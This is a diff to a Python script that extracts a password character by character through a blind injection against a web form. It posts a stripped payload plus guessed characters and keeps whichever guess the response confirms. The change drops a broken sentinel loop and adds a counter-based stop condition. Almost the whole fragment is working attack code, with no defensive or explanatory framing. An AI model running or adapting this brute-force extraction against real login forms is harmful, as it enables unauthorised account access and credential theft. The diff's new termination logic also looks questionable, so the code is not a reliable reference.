@@ -29,13 +29,8 @@ for c in wordlist:
         filteredWordlist += c
 print("The available characters are " + filteredWordlist)
 
-# Add a character not found in the password to the end of the new wordlist to know when the password has been discovered
-for c in filteredWordlist:
-    if c not in filteredWordlist:
-        filteredWordlist += c
-        break
-
 # Using the new wordlist, brute force each character of the password until it is discovered
+count = 0
 while True:
     for c in filteredWordlist:
         Data = {fieldName: payload.replace('%', '') + password + c + ending}
@@ -45,6 +40,7 @@ while True:
             password += c
             print(password)
             break
-        elif c == "#":
-            print("The password is " + password)
-            exit()
+    count += 1
+    if count == len(filteredWordlist) + len(password):
+        print("The password is " + password)
+        exit()
